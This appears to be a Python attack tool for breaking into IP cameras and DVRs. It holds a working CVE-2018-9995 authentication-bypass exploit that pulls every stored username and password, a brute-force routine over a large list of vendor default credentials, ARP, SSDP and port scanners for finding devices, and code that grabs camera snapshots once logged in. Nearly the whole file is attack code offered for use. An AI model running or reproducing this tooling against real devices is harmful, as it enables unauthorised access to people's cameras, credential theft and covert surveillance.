import re
import requests
import urllib3
import socket
import json
import hashlib
import base64
import asyncio
import httpx
import numpy as np
import cv2
import psutil
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Advanced AI/Military Libs
try:
    from scapy.all import ARP, Ether, srp, conf
    SCAPY_AVAILABLE = True
except:
    SCAPY_AVAILABLE = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Intelligence Constants ---
DEFAULT_LOGINS = [
    # Standard Defaults
    ('admin', 'admin'), ('admin', '12345'), ('admin', '123456'), 
    ('admin', ''), ('root', 'root'), ('admin', 'password'), 
    ('admin', '1234'), ('user', 'user'), ('guest', 'guest'),
    ('admin', 'admin123'), ('admin', '12345678'), ('service', 'service'),
    ('ubnt', 'ubnt'), ('root', 'admin'), ('root', '12345'),
    ('admin', 'pass'), ('admin', 'admin1234'), ('default', 'default'),
    # Night Owl Specific Defaults
    ('admin', 'nightowl'), ('admin', '111111'), ('admin', '000000'),
    ('admin', '888888'), ('admin', '666666'), ('user', ''),
    ('administrator', 'admin'), ('administrator', ''),
    # Hikvision Defaults
    ('admin', 'Hikvision'), ('admin', 'hik12345'), ('admin', '12345'),
    # Dahua Defaults  
    ('admin', 'Dahua'), ('admin', 'dahua'), ('888888', '888888'),
    # Other Common DVR
    ('admin', 'DVR'), ('admin', 'dvr2020'), ('admin', 'meinsm'),
    ('admin', '4321'), ('admin', '7ujMko0admin'), ('support', 'support'),
    ('root', 'vizxv'), ('root', 'xc3511'), ('root', 'zlxx.')
]

# Night Owl Specific Login Endpoints
NIGHT_OWL_ENDPOINTS = [
    '/cgi-bin/webUserLogin.cgi',
    '/login.cgi',
    '/ISAPI/Security/userCheck',
    '/cgi-bin/hi3510/param.cgi?cmd=login',
    '/webconsole/login',
    '/RPC2_Login',
    '/cgi-bin/Net_Web_Login.cgi',
    '/cmd/info?info=users',
    '/device.rsp?opt=user&cmd=list'
]

CAMERA_MAC_PREFIXES = {
    'B0:C5:54': 'Hikvision', '00:40:8C': 'Axis', 'BC:32:AC': 'Hikvision',
    '70:B3:D5': 'Dahua', '00:1A:07': 'Dahua', '38:AF:29': 'Dahua',
    '00:0B:3F': 'Zosi', '00:E0:4C': 'Realtek (Generic IP Cam)',
    '00:12:12': 'Dahua', '00:12:16': 'Dahua', '00:12:41': 'Hikvision'
}

class SecurityEngine:
    def __init__(self):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        }

    # --- 💉 EXPLOIT: CVE-2018-9995 (DVR Auth Bypass) - FULL VERSION ---
    def exploit_cve_2018_9995(self, host, port, protocol='http', timeout=15):
        """
        Exploit for TVT/Dahua/Night Owl and many Chinese DVRs
        Uses /device.rsp?opt=user&cmd=list to extract ALL credentials
        Based on @capitan_alfa exploit
        """
        creds = []
        
        # Multiple exploit endpoints to try
        exploit_endpoints = [
            '/device.rsp?opt=user&cmd=list',  # Main exploit endpoint
            '/login.rsp',                      # Alternative endpoint
            '/dvr/cmd/user.cgi?cmd=list',     # Some models
            '/cgi-bin/user.cgi?cmd=list',     # CGI variant
        ]
        
        # Special headers with bypass cookie
        exploit_headers = {
            "Host": f"{host}:{port}",
            "User-Agent": "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "es-AR,en-US;q=0.7,en;q=0.3",
            "Connection": "close",
            "Content-Type": "text/html",
            "Cookie": "uid=admin"  # THE MAGIC BYPASS COOKIE
        }
        
        for endpoint in exploit_endpoints:
            url = f"{protocol}://{host}:{port}{endpoint}"
            try:
                res = requests.get(url, headers=exploit_headers, timeout=timeout, verify=False)
                
                if res.status_code == 200:
                    # Try to parse as JSON (the real exploit returns JSON)
                    try:
                        data = res.json()
                        if 'list' in data:
                            # SUCCESS! Extract all users
                            for user_obj in data['list']:
                                uid = user_obj.get('uid', '')
                                pwd = user_obj.get('pwd', '')
                                role = user_obj.get('role', 'unknown')
                                if uid:
                                    creds.append({
                                        'user': uid, 
                                        'pass': pwd, 
                                        'method': f'CVE-2018-9995 [{endpoint}]',
                                        'role': role
                                    })
                            if creds:
                                return creds
                    except:
                        pass
                    
                    # Fallback: Try regex extraction if JSON fails
                    if 'uid' in res.text and 'pwd' in res.text:
                        # Pattern 1: "uid":"xxx","pwd":"yyy"
                        matches = re.findall(r'"uid"\s*:\s*"([^"]*)",\s*"pwd"\s*:\s*"([^"]*)"', res.text)
                        for u, p in matches:
                            creds.append({'user': u, 'pass': p, 'method': f'CVE-2018-9995 [regex:{endpoint}]'})
                        
                        # Pattern 2: uid=xxx&pwd=yyy (URL encoded)
                        if not matches:
                            matches = re.findall(r'uid=([^&\s]+).*?pwd=([^&\s"]+)', res.text)
                            for u, p in matches:
                                creds.append({'user': u, 'pass': p, 'method': f'CVE-2018-9995 [url:{endpoint}]'})
                        
                        if creds:
                            return creds
                            
            except requests.exceptions.Timeout:
                continue
            except Exception as e:
                continue
        
        return creds

    # --- 🎯 AUTO LOCAL NETWORK DETECTION ---
    def get_local_ip_and_range(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            base_ip = ".".join(local_ip.split(".")[:-1]) + ".0/24"
            return local_ip, base_ip
        except: return "127.0.0.1", "192.168.1.0/24"

    # --- 🛰️ STEALTH ARP RADAR ---
    def local_area_radar(self):
        _, network_range = self.get_local_ip_and_range()
        found_cameras = []
        
        # If Scapy/Npcap is not ready, perform a multi-threaded socket scan instead
        if not SCAPY_AVAILABLE:
            return self.fast_socket_discovery(network_range.replace('/24', ''))

        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range), timeout=2, verbose=False)
            for _, rcv in ans:
                ip = rcv.psrc
                mac = rcv.hwsrc.upper()
                vendor = "Unknown Device"
                for prefix, name in CAMERA_MAC_PREFIXES.items():
                    if mac.startswith(prefix):
                        vendor = f"{name} Camera"
                        break
                
                if self.scan_port(ip, 80) or self.scan_port(ip, 8000) or self.scan_port(ip, 554):
                    found_cameras.append({'ip': ip, 'mac': mac, 'vendor': vendor, 'status': 'Online'})
            return found_cameras
        except:
            return self.fast_socket_discovery(network_range.replace('/24', ''))

    def fast_socket_discovery(self, base_net):
        """Threaded fallback discovery if ARP scan fails"""
        ips = [f"{base_net.rsplit('.', 1)[0]}.{i}" for i in range(1, 255)]
        discovered = []
        def check_ip(ip):
            if self.scan_port(ip, 80) or self.scan_port(ip, 8000):
                return {'ip': ip, 'mac': 'N/A', 'vendor': 'Generic Camera', 'status': 'Online'}
            return None
        with ThreadPoolExecutor(max_workers=50) as ex:
            results = ex.map(check_ip, ips)
            discovered = [r for r in results if r]
        return discovered

    def scan_port(self, host, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1.5) # Increased timeout for reliability
                return s.connect_ex((host, int(port))) == 0
        except: return False

    # --- 🧠 AI IMAGE ANALYSIS ---
    def analyze_image_with_ai(self, image_bytes):
        try:
            nparr = np.frombuffer(image_bytes, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is None: return "No Image Data"
            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            score = cv2.Laplacian(gray, cv2.CV_64F).var()
            analysis = "Clear Visual" if score > 80 else "Blurry/Dark"
            return f"AI Quality: {analysis} ({int(score)})"
        except: return "AI Offline"

    def capture_eye_snapshot(self, host, port, user, pwd, protocol='http'):
        paths = [
            '/snapshot.jpg', '/cgi-bin/snapshot.cgi', '/image.jpg', 
            '/Streaming/Channels/1/picture', '/dvr/snapshot.jpg', '/onvif-http/snapshot?profile=1'
        ]
        for path in paths:
            try:
                res = requests.get(f"{protocol}://{host}:{port}{path}", auth=(user, pwd), timeout=4, verify=False)
                if res.status_code == 200 and 'image' in res.headers.get('Content-Type', ''):
                    analysis = self.analyze_image_with_ai(res.content)
                    return {
                        'base64': base64.b64encode(res.content).decode('utf-8'),
                        'analysis': analysis
                    }
            except: continue
        return None

    def fingerprint(self, host, port, protocol):
        try:
            res = requests.get(f"{protocol}://{host}:{port}/", headers=self.headers, timeout=4, verify=False)
            soup = BeautifulSoup(res.text, 'html.parser')
            server = res.headers.get('Server', 'Hidden')
            title = soup.title.string.strip() if soup.title else "Camera Gateway"
            
            # Smart Detection
            if "dvr" in title.lower() or "dvr" in server.lower():
                return f"🚨 DVR SYSTEM DETECTED | {title}"
            return f"{title} | {server}"
        except: return "Offline/Protected"

    async def async_brute(self, host, port, protocol='http'):
        """Asynchronous smart brute forcing - Supports Basic, Digest Auth & Form POST"""
        from httpx import DigestAuth
        
        async with httpx.AsyncClient(verify=False, timeout=8.0, follow_redirects=True) as client:
            # Common Login Endpoints for DVRs
            endpoints = ['', 'login', 'index.html', 'user/login', 'api/login']
            
            for user, pwd in DEFAULT_LOGINS:
                # === A. Try Basic Auth ===
                try:
                    res = await client.get(f"{protocol}://{host}:{port}/", auth=(user, pwd))
                    low_text = res.text.lower()
                    
                    if res.status_code == 200:
                        if 'type="password"' not in low_text and 'type=\'password\'' not in low_text:
                            return [{'user': user, 'pass': pwd, 'method': 'HTTP-Basic-Auth'}]
                        if any(x in low_text for x in ['success', 'logined', 'main.asp', 'video', 'live', 'dashboard']):
                            if '<input' not in low_text:
                                return [{'user': user, 'pass': pwd, 'method': 'HTTP-Basic-Auth'}]
                except: pass

                # === B. Try Digest Auth (Night Owl, Hikvision, Dahua) ===
                try:
                    res_digest = await client.get(f"{protocol}://{host}:{port}/", auth=DigestAuth(user, pwd))
                    if res_digest.status_code == 200:
                        low_text = res_digest.text.lower()
                        if 'type="password"' not in low_text:
                            return [{'user': user, 'pass': pwd, 'method': 'Digest-Auth'}]
                except: pass

                # === C. Try Night Owl Specific Endpoints ===
                try:
                    for owl_ep in NIGHT_OWL_ENDPOINTS:
                        url = f"{protocol}://{host}:{port}{owl_ep}"
                        
                        # GET with auth
                        res_owl = await client.get(url, auth=(user, pwd))
                        if res_owl.status_code == 200 and 'error' not in res_owl.text.lower():
                            if 'uid' in res_owl.text or 'user' in res_owl.text or 'admin' in res_owl.text:
                                return [{'user': user, 'pass': pwd, 'method': f'NightOwl-API:{owl_ep}'}]
                        
                        # POST with credentials
                        payloads = [
                            {'username': user, 'password': pwd},
                            {'user': user, 'pass': pwd},
                            {'name': user, 'pwd': pwd},
                            {'login': user, 'password': pwd}
                        ]
                        for data in payloads:
                            res_post = await client.post(url, data=data)
                            if res_post.status_code == 200:
                                txt = res_post.text.lower()
                                # Success indicators
                                if any(x in txt for x in ['success', 'ok', 'true', 'logined', 'welcome']):
                                    if 'fail' not in txt and 'error' not in txt:
                                        return [{'user': user, 'pass': pwd, 'method': f'NightOwl-POST:{owl_ep}'}]
                except: pass

                # === D. Try Standard Form POST ===
                try:
                    payloads = [
                        {'username': user, 'password': pwd},
                        {'user': user, 'pass': pwd},
                        {'id': user, 'pwd': pwd},
                        {'user_name': user, 'password': pwd}
                    ]
                    
                    for ep in endpoints:
                        url = f"{protocol}://{host}:{port}/{ep}"
                        for data in payloads:
                            res_post = await client.post(url, data=data)
                            
                            # Check 1: Redirects
                            if res_post.history and res_post.history[0].status_code in [301, 302]:
                                return [{'user': user, 'pass': pwd, 'method': 'Form-Post-Redirect'}]
                                
                            # Check 2: JSON Success
                            if '{' in res_post.text and '}' in res_post.text:
                                txt = res_post.text.lower()
                                if '"success"' in txt or '"status":"ok"' in txt or 'true' in txt:
                                    if 'error' not in txt and 'fail' not in txt:
                                        return [{'user': user, 'pass': pwd, 'method': 'Form-Post-JSON'}]
                            
                            # Check 3: Cookie Set
                            if any(c in res_post.cookies for c in ['session', 'token', 'JSESSIONID', 'sid']):
                                return [{'user': user, 'pass': pwd, 'method': 'Form-Post-Cookie'}]
                except: pass
                
        return []

    def silent_radar_discovery(self):
        """UPnP/SSDP Discovery for local devices"""
        discovered = []
        msg = 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.settimeout(2)
            s.sendto(msg.encode(), ('239.255.255.250', 1900))
            while True:
                data, addr = s.recvfrom(2048)
                if addr[0] not in discovered: discovered.append(addr[0])
        except: pass
        return discovered

    def discover_ports(self, host):
        common = [80, 81, 8080, 8000, 554, 37777, 34567, 8181]
        return [p for p in common if self.scan_port(host, p)]

    def scan_ip_range(self, start_ip, end_ip, port):
        import ipaddress
        try:
            start = ipaddress.IPv4Address(start_ip)
            end = ipaddress.IPv4Address(end_ip)
            ips = [str(ipaddress.IPv4Address(int(start) + i)) for i in range(int(end) - int(start) + 1)]
            def check(ip): return ip if self.scan_port(ip, port) else None
            with ThreadPoolExecutor(max_workers=100) as ex:
                return [ip for ip in ex.map(check, ips) if ip]
        except: return []
